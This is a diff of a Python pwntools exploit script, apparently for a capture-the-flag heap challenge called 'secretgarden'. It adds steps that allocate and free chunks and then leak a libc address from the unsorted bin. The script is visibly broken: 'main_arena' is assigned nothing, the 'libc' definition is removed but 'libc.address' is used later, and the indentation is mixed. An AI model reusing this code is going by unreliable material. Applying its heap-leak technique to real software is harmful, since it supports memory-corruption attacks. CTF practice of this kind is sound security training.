@@ -5,13 +5,11 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
-context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
-
 if sys.argv[1] == "l":
+    context.log_level = "debug"
     #  io = process("./secretgarden", env = {"LD_PRELOAD": "./libc_64.so.6"})
     io = process("./secretgarden")
-    libc = io.libc
     main_arena = 
 
 else:
@@ -22,7 +20,7 @@ else:
 
 def DEBUG():
 	raw_input("DEBUG: ")
-	gdb.attach(io)
+        gdb.attach(io)
 
 def Raise(length, name, color):
     io.sendlineafter(" : ", "1")
@@ -42,5 +40,13 @@ def Clean():
 
 if __name__ == "__main__":
     success("Leak libc.address")
+    Raise(160, '0000', '0')
+    DEBUG()
+    Raise(160, '1111', '1')
+    Remove(0)
+    Raise(160, '00000000', '0')
+    Visit()
+    libc.address = u64(io.recvuntil("\x7f").ljust(8, '\x00')) - 88 - main_arena
+    success("libc.address -> {:#}".format(libc.address))
+    pause()
 
-    
